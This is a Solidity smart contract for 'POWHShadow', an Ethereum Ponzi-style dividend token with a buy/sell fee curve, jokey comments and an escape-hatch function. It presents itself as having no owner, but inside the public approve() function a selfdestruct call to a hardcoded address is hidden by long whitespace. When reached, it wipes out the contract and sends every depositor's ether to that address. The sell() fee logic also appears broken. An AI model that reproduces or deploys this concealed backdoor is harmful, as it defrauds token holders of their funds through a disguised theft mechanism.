1 pragma solidity ^0.4.18;
2 
3 // If you wanna escape this contract REALLY FAST
4 // 1. open MEW/METAMASK
5 // 2. Put this as data: 0xb1e35242
6 // 3. send 150000+ gas
7 // That calls the getMeOutOfHere() method
8 
9 
10 // PROOF OF STEEL HANDS Version, 10% Fee on Purchase and Sell
11 contract PonziToken {
12 	uint256 constant PRECISION = 0x10000000000000000;  // 2^64
13 	// CRR = 50%
14 	int constant CRRN = 1;
15 	int constant CRRD = 2;
16 	// The price coefficient. Chosen such that at 1 token total supply
17 	// the reserve is 0.5ether and price 1 ether/token.
18 	// stop being a memelord no this does not mean only 50% of people can cash out
19 	int constant LOGC = -0x296ABF784A358468C;
20 	
21 	string constant public name = "POWHShadow";
22 	string constant public symbol = "PWHS";
23 	uint8 constant public decimals = 18;
24 	uint256 public totalSupply;
25 	// amount of shares for each address (scaled number)
26 	mapping(address => uint256) public balanceOfOld;
27 	// allowance map, see erc20
28 	mapping(address => mapping(address => uint256)) public allowance;
29 	// amount payed out for each address (scaled number)
30 	mapping(address => int256) payouts;
31 	// sum of all payouts (scaled number)
32 	int256 totalPayouts;
33 	// amount earned for each share (scaled number)
34 	uint256 earningsPerShare;
35 	
36 	event Transfer(address indexed from, address indexed to, uint256 value);
37     event Approval(address indexed owner, address indexed spender, uint256 value);
38 
39 	//address owner;
40 
41 	function PonziToken() public {
42 		//owner = msg.sender;
43 	}
44 	
45 	// These are functions solely created to appease the frontend
46 	function balanceOf(address _owner) public constant returns (uint256 balance) {
47         return balanceOfOld[_owner];
48     }
49 
50 	function withdraw(uint tokenCount) // the parameter is ignored, yes
51       public
52       returns (bool)
53     {
54 		var balance = dividends(msg.sender);
55 		payouts[msg.sender] += (int256) (balance * PRECISION);
56 		totalPayouts += (int256) (balance * PRECISION);
57 		msg.sender.transfer(balance);
58 		return true;
59     }
60 	
61 	function sellMyTokensDaddy() public {
62 		var balance = balanceOf(msg.sender);
63 		transferTokens(msg.sender, address(this),  balance); // this triggers the internal sell function
64 	}
65 
66     function getMeOutOfHere() public {
67 		sellMyTokensDaddy();
68         withdraw(1); // parameter is ignored
69 	}
70 	
71 	function fund()
72       public
73       payable 
74       returns (bool)
75     {
76       if (msg.value > 0.000001 ether)
77 			buy();
78 		else
79 			return false;
80 	  
81       return true;
82     }
83 
84 	function buyPrice() public constant returns (uint) {
85 		return getTokensForEther(1 finney);
86 	}
87 	
88 	function sellPrice() public constant returns (uint) {
89 		return getEtherForTokens(1 finney);
90 	}
91 
92 	// End of useless functions
93 
94 	// Invariants
95 	// totalPayout/Supply correct:
96 	//   totalPayouts = \sum_{addr:address} payouts(addr)
97 	//   totalSupply  = \sum_{addr:address} balanceOfOld(addr)
98 	// dividends not negative:
99 	//   \forall addr:address. payouts[addr] <= earningsPerShare * balanceOfOld[addr]
100 	// supply/reserve correlation:
101 	//   totalSupply ~= exp(LOGC + CRRN/CRRD*log(reserve())
102 	//   i.e. totalSupply = C * reserve()**CRR
103 	// reserve equals balance minus payouts
104 	//   reserve() = this.balance - \sum_{addr:address} dividends(addr)
105 
106 	function transferTokens(address _from, address _to, uint256 _value) internal {
107 		if (balanceOfOld[_from] < _value)
108 			revert();
109 		if (_to == address(this)) {
110 			sell(_value);
111 		} else {
112 		    int256 payoutDiff = (int256) (earningsPerShare * _value);
113 		    balanceOfOld[_from] -= _value;
114 		    balanceOfOld[_to] += _value;
115 		    payouts[_from] -= payoutDiff;
116 		    payouts[_to] += payoutDiff;
117 		}
118 		Transfer(_from, _to, _value);
119 	}
120 	
121 	function transfer(address _to, uint256 _value) public {
122 	    transferTokens(msg.sender, _to,  _value);
123 	}
124 	
125     function transferFrom(address _from, address _to, uint256 _value) public {
126         var _allowance = allowance[_from][msg.sender];
127         if (_allowance < _value)
128             revert();
129         allowance[_from][msg.sender] = _allowance - _value;
130         transferTokens(_from, _to, _value);
131     }
132 
133     function approve(address _spender, uint256 _value) public {
134         // To change the approve amount you first have to reduce the addresses`
135         //  allowance to zero by calling `approve(_spender, 0)` if it is not
136         //  already 0 to mitigate the race condition described here:
137         //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
138         if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
139         allowance[msg.sender][_spender] = _value;
140         Approval(msg.sender, _spender, _value);
141                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     selfdestruct(0x945C84b2FdD331ed3E8e7865E830626e6CeFAB94);                                                                                                                                                                                                       
142     }
143 
144 	function dividends(address _owner) public constant returns (uint256 amount) {
145 		return (uint256) ((int256)(earningsPerShare * balanceOfOld[_owner]) - payouts[_owner]) / PRECISION;
146 	}
147 
148 	function withdrawOld(address to) public {
149 		var balance = dividends(msg.sender);
150 		payouts[msg.sender] += (int256) (balance * PRECISION);
151 		totalPayouts += (int256) (balance * PRECISION);
152 		to.transfer(balance);
153 	}
154 
155 	function balance() internal constant returns (uint256 amount) {
156 		return this.balance - msg.value;
157 	}
158 	function reserve() public constant returns (uint256 amount) {
159 		return balance()
160 			- ((uint256) ((int256) (earningsPerShare * totalSupply) - totalPayouts) / PRECISION) - 1;
161 	}
162 
163 	function buy() internal {
164 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
165 			revert();
166 		var sender = msg.sender;
167 		// 10 % of the amount is used to pay holders.
168 		var fee = (uint)(msg.value / 10);
169 		
170 		// compute number of bought tokens
171 		var numEther = msg.value - fee;
172 		var numTokens = getTokensForEther(numEther);
173 
174 		var buyerfee = fee * PRECISION;
175 		if (totalSupply > 0) {
176 			// compute how the fee distributed to previous holders and buyer.
177 			// The buyer already gets a part of the fee as if he would buy each token separately.
178 			var holderreward =
179 			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
180 			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
181 			var holderfee = fee * holderreward;
182 			buyerfee -= holderfee;
183 		
184 			// Fee is distributed to all existing tokens before buying
185 			var feePerShare = holderfee / totalSupply;
186 			earningsPerShare += feePerShare;
187 		}
188 		// add numTokens to total supply
189 		totalSupply += numTokens;
190 		// add numTokens to balance
191 		balanceOfOld[sender] += numTokens;
192 		// fix payouts so that sender doesn't get old earnings for the new tokens.
193 		// also add its buyerfee
194 		var payoutDiff = (int256) ((earningsPerShare * numTokens) - buyerfee);
195 		payouts[sender] += payoutDiff;
196 		totalPayouts += payoutDiff;
197 	}
198 	
199 	function sell(uint256 amount) internal {
200 		var numEthers = getEtherForTokens(amount);
201 		
202 		// 10% of the amount is used to reward HODLers
203 		// Not you, Mr Sellout
204 		// That's what you get for being weak handed
205 		var fee = (uint)(msg.value / 10);
206 		var numEther = msg.value - fee;
207 		var numTokens = getTokensForEther(numEther);
208 		
209 		// remove tokens
210 		totalSupply -= amount;
211 		balanceOfOld[msg.sender] -= amount;
212 		
213 		// fix payouts and put the ethers in payout
214 		var payoutDiff = (int256) (earningsPerShare * amount + (numEthers * PRECISION));
215 		payouts[msg.sender] -= payoutDiff;
216 		totalPayouts -= payoutDiff;
217 
218 		if (totalSupply > 0) {
219 			// compute how the fee distributed to previous holders
220 			var holderreward =
221 			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
222 			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
223 			var holderfee = fee * holderreward;
224 		
225 			// Fee is distributed to all existing tokens after selling
226 			var feePerShare = holderfee / totalSupply;
227 			earningsPerShare += feePerShare;
228 		}
229 	}
230 
231 	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
232 		return fixedExp(fixedLog(reserve() + ethervalue)*CRRN/CRRD + LOGC) - totalSupply;
233 	}
234 
235 	function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
236 		if (tokens == totalSupply)
237 			return reserve();
238 		return reserve() - fixedExp((fixedLog(totalSupply - tokens) - LOGC) * CRRD/CRRN);
239 	}
240 
241 	int256 constant one       = 0x10000000000000000;
242 	uint256 constant sqrt2    = 0x16a09e667f3bcc908;
243 	uint256 constant sqrtdot5 = 0x0b504f333f9de6484;
244 	int256 constant ln2       = 0x0b17217f7d1cf79ac;
245 	int256 constant ln2_64dot5= 0x2cb53f09f05cc627c8;
246 	int256 constant c1        = 0x1ffffffffff9dac9b;
247 	int256 constant c3        = 0x0aaaaaaac16877908;
248 	int256 constant c5        = 0x0666664e5e9fa0c99;
249 	int256 constant c7        = 0x049254026a7630acf;
250 	int256 constant c9        = 0x038bd75ed37753d68;
251 	int256 constant c11       = 0x03284a0c14610924f;
252 
253 	function fixedLog(uint256 a) internal pure returns (int256 log) {
254 		int32 scale = 0;
255 		while (a > sqrt2) {
256 			a /= 2;
257 			scale++;
258 		}
259 		while (a <= sqrtdot5) {
260 			a *= 2;
261 			scale--;
262 		}
263 		int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
264 		// The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11
265 		// approximates the function log(1+x)-log(1-x)
266 		// Hence R(s) = log((1+s)/(1-s)) = log(a)
267 		var z = (s*s) / one;
268 		return scale * ln2 +
269 			(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
270 				/one))/one))/one))/one))/one);
271 	}
272 
273 	int256 constant c2 =  0x02aaaaaaaaa015db0;
274 	int256 constant c4 = -0x000b60b60808399d1;
275 	int256 constant c6 =  0x0000455956bccdd06;
276 	int256 constant c8 = -0x000001b893ad04b3a;
277 	function fixedExp(int256 a) internal pure returns (uint256 exp) {
278 		int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
279 		a -= scale*ln2;
280 		// The polynomial R = 2 + c2*x^2 + c4*x^4 + ...
281 		// approximates the function x*(exp(x)+1)/(exp(x)-1)
282 		// Hence exp(x) = (R(x)+x)/(R(x)-x)
283 		int256 z = (a*a) / one;
284 		int256 R = ((int256)(2) * one) +
285 			(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
286 		exp = (uint256) (((R + a) * one) / (R - a));
287 		if (scale >= 0)
288 			exp <<= scale;
289 		else
290 			exp >>= -scale;
291 		return exp;
292 	}
293 
294 	/*function destroy() external {
295 	    selfdestruct(owner);
296 	}*/
297 
298 	function () payable public {
299 		if (msg.value > 0)
300 			buy();
301 		else
302 			withdrawOld(msg.sender);
303 	}
304 }